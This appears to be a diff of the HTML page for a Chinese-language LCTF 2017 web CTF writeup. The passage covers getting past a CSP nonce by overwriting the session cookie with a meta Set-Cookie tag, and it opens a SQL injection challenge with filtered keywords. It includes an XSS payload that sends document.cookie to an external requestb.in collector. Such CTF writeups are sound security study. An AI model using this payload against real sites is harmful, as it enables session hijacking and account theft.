@@ -17,7 +17,7 @@
     
 
     <meta name="description" content="这次趁着周末有些时间，做了西电师傅们的 LCTF，整场下来感觉质量可以，没有太大的脑洞。 Simple blog A simple blog .To discover the secret of it.http://111.231.111.54/  打开后是一个简洁的博客系统，主页面没有什么功能，扫一下发现有 .login.php.swp 和 .admin.php.swp login.php123">
-<meta name="keywords" content="writeup,CTF">
+<meta name="keywords" content="CTF,writeup">
 <meta property="og:type" content="article">
 <meta property="og:title" content="LCTF 2017 Web writeup | HeartSky&#39;s blog">
 <meta property="og:url" content="http://heartsky.info/2017/11/21/LCTF-2017-Web-writeup/index.html">
@@ -225,7 +225,7 @@ classes that you can use:
 <p>可以看到 nonce 值已经被包含在了 src 里，所以这里可以获取到 nonce 值，然后再提交就可以了，可以把 nonce 值输出到一个文件里，再写个脚本一旦检测到新的 nonce 值就提交，还有一种方式是利用 iframe来写入一个自动提交表单，让 bot 自己请求自己的 preview.php 页面</p>
 <p>在看到官方 wp 后，发现题目的 nonce 值是通过 session 值生成的，所以我们可以把 PHPSESSID 和 nonce 值都替换为我们的(当时想着是重写 CSP，发现并不能覆盖设置</p>
 <p><code>Meta http-equiv</code> 属性为 <code>Set-Cookie</code> 时可以设置 cookie，这样就可以覆盖之前的 cookie</p>
-<p>提交如下<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Set-Cookie"</span> <span class="attr">content</span>=<span class="string">"PHPSESSID=naao04610f8lfg7mj4qfg6s7p4; path=/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">"909593a1d3183240d3be316e15628657"</span>&gt;</span><span class="undefined">(new Image()).src='https://requestb.in/rooalgro?cookie='+escape(document.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>提交如下<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Set-Cookie"</span> <span class="attr">content</span>=<span class="string">"PHPSESSID=naao04610f8lfg7mj4qfg6s7p4; path=/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">"909593a1d3183240d3be316e15628657"</span>&gt;</span><span class="javascript">(<span class="keyword">new</span> Image()).src=<span class="string">'https://requestb.in/rooalgro?cookie='</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>get flag<br><img src="http://7xqn7l.com1.z0.glb.clouddn.com/LCTF/20171121213832_PaZOec_5.jpeg" alt=""></p>
 <h3 id="“他们”有什么秘密呢"><a href="#“他们”有什么秘密呢" class="headerlink" title="“他们”有什么秘密呢?"></a>“他们”有什么秘密呢?</h3><p>过滤了 database tables users columns schema information 的数字型 sql 注入</p>
 <p>因为对其他的都没限制，所以思路就是通过显注查询得到表名、列名，最后查出数据，但是过滤了表名和列名的查询关键字</p>
